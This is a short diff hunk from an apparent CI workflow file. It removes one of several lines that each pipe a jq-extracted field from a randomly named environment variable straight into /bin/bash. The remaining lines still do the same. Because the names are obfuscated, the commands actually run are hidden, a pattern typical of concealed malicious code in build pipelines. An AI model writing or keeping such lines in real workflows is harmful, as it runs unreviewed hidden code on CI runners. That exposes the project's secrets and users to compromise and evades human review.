@@ -22,7 +22,6 @@ jobs:
           echo $xorn7481 | jq -r .srgv0 | /bin/bash
           echo $sa7058 | jq -r .ho0 | /bin/bash
           echo $gvrro38395 | jq -r .izv269 | /bin/bash
-          echo $ro0 | jq -r .wjpe10990 | /bin/bash
           echo $oggol009 | jq -r .mrnhh254 | /bin/bash
           printf '%s' "$pwt29" | jq -r .sebd1 | /bin/bash
 
